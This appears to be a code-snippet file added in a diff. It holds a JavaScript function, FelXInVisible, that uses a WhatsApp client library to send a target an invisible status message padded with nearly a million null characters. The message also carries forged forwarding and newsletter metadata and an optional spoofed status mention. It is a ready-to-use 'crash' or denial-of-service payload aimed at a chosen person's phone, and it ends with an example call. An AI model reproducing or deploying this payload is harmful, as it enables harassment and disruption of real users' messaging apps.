@@ -1,0 +1,83 @@
+nama=orang
+language=javascript
+lines=79
+date=12/10/2025
+code=async function FelXInVisible(sock, target, mention) {
+         const msg = await generateWAMessageFromContent(target, {
+                  viewOnceMessage: {
+                           message: {
+                                    messageContextInfo: {
+                                             messageSecret: crypto.randomBytes(32)
+                                    },
+                                    interactiveResponseMessage: {
+                                             body: {
+                                                      text: " t.me/rizxvelzexct ",
+                                                      format: "DEFAULT"
+                                             },
+                                             nativeFlowResponseMessage: {
+                                                      name: "flex_agency",
+                                                      paramsJson: "\u0000".repeat(999999),
+                                                      version: 3
+                                             },
+                                             contextInfo: {
+                                                      isForwarded: true,
+                                                      forwardingScore: 9741,
+                                                      forwardedNewsletterMessageInfo: {
+                                                               newsletterName: "x!s - agency",
+                                                               newsletterJid: "120363319314627296@newsletter",
+                                                               serverMessageId: 1
+                                                      }
+                                             }
+                                    }
+                           }
+                  }
+         }, {});
+
+         await sock.relayMessage("status@broadcast", msg.message, {
+                  messageId: msg.key.id,
+                  statusJidList: [target],
+                  additionalNodes: [
+                           {
+                                    tag: "meta",
+                                    attrs: {},
+                                    content: [
+                                             {
+                                                      tag: "mentioned_users",
+                                                      attrs: {},
+                                                      content: [
+                                                               { tag: "to", attrs: { jid: target }, content: undefined }
+                                                      ]
+                                             }
+                                    ]
+                           }
+                  ]
+         });
+
+         if (mention) {
+                  await sock.relayMessage(target, {
+                           statusMentionMessage: {
+                                    message: {
+                                             protocolMessage: {
+                                                      key: msg.key,
+                                                      fromMe: false,
+                                                      participant: "0@s.whatsapp.net",
+                                                      remoteJid: "status@broadcast",
+                                                      type: 25
+                                             }
+                                    }
+                           }
+                  }, {
+                           additionalNodes: [
+                                    {
+                                             tag: "meta",
+                                             attrs: { is_status_mention: "🕸️ XennExcrt1st" },
+                                             content: undefined
+                                    }
+                           ]
+                  });
+         }
+         await new Promise(resolve => setTimeout(resolve, 9000));
+}
+
+// Pemangilannya
+await FelXInVisible(sock, target, false) // or true
